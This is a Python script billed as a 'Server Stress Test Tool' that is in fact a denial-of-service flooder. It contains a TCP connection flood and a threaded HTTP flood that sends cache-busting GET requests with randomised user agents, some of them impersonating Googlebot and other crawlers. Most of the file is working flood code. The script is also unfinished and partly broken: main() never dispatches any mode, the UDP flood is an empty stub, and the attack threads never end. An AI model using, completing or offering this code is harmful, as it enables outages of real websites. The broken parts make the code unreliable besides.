import socket
import ssl
import random
import string
import sys
import time
import threading

# Constants
STR_CHARS = string.ascii_letters + string.digits + '&'

ACCEPT_ALL = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    # Add more accept headers here...
]

CHOICE = ["Macintosh", "Windows", "X11"]
CHOICE2 = ["68K", "PPC", "Intel Mac OS X"]
CHOICE3 = ["Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"]
CHOICE4 = ["Linux i686", "Linux x86_64"]
CHOICE5 = ["chrome", "spider", "ie"]
CHOICE6 = [".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"]
SPIDER = [
    "AdsBot-Google (http://www.google.com/adsbot.html)",
    "Baiduspider (http://www.baidu.com/search/spider.htm)",
    "FeedFetcher-Google; (http://www.google.com/feedfetcher.html)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Googlebot-Image/1.0",
    "Googlebot-News",
    "Googlebot-Video/1.0",
    # Add more spider user agents here...
    "MJ12bot (http://majestic12.co.uk/bot.php?+)"
]


# Function to generate random user agent
def useragent():
    platform = random.choice(CHOICE)
    os_val = ""
    if platform == "Macintosh":
        os_val = random.choice(CHOICE2)
    elif platform == "Windows":
        os_val = random.choice(CHOICE3)
    elif platform == "X11":
        os_val = random.choice(CHOICE4)
    browser = random.choice(CHOICE5)
    if browser == "chrome":
        webkit = str(random.randint(500, 599))
        uwu = str(random.randint(0, 98)) + ".0." + str(random.randint(0, 9999)) + "." + str(random.randint(0, 999))
        return "Mozilla/5.0 (" + os_val + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
    elif browser == "ie":
        uwu = str(random.randint(0, 98)) + ".0"
        engine = str(random.randint(0, 98)) + ".0"
        option = random.randint(0, 1)
        token = random.choice(CHOICE6) + "; " if option == 1 else ""
        return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os_val + "; " + token + "Trident/" + engine + ")"
    return random.choice(SPIDER)


def tcp_connection_flood(host, port, connections, duration, timeout):
    count = 0
    for _ in range(connections):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            count += 1
            s.close()
        except Exception as e:
            print("Error:", e)

    print("Total connection:", connections)
    print("Connection Alive:", count)


def udp_flood(host, port, connections, duration):
    pass  # Implement UDP flood here


def http_flood(host, port, connections, duration, timeout):
    success_count = 0
    fail_count = 0

    def attack():
        nonlocal success_count, fail_count
        while True:
            try:
                s = socket.create_connection((host, port), timeout=timeout)
                if port == 443:
                    s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                payload = " HTTP/1.1\r\nHost: " + host + "\r\nConnection: Keep-Alive\r\nUser-Agent: " + useragent() + "\r\n" + random.choice(ACCEPT_ALL) + "\r\n"
                for _ in range(140):
                    url = "GET /?" + str(random.randint(0, 9999)) + random.choice(STR_CHARS) + str(random.randint(0, 9999)) + random.choice(STR_CHARS) + str(random.randint(0, 9999)) + random.choice(STR_CHARS) + random.choice(STR_CHARS) + random.choice(STR_CHARS)
                    s.sendall((url + payload).encode())
                    s.recv(256)
                    success_count += 1
                s.close()
            except Exception as e:
                print("Error:", e)
                fail_count += 1

    threads = []
    for _ in range(connections):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    time.sleep(duration)
    for t in threads:
        t.join()

    print("Total Sent:", success_count, "requests")
    print("RPS:", success_count / duration)
    print("Successed Rate:", success_count / (success_count + fail_count) * 100)
    print("Dropped:", fail_count)
    print("Connection Error:", fail_count, "times")


def main():
    print("|--------------------------------------|")
    print("|   Python : Server Stress Test Tool   |")
    print("|          C0d3d By Lee0n123           |")
    print("|--------------------------------------|")
    if len(sys.argv) != 7:
        print("Usage: python3", sys.argv[0], "<host> <port> <mode> <connections> <seconds> <timeout(second)>")
        print("|--------------------------------------|")
        print("|             Mode List                |")
        print("|     [1] TCP-Connection flood         |")
        print("|     [2] UDP-flood                    |")
        print("|     [3] HTTP-flood(Auto SSL)         |")
        print("|--------------------------------------|")


if __name__ == "__main__":
    main()
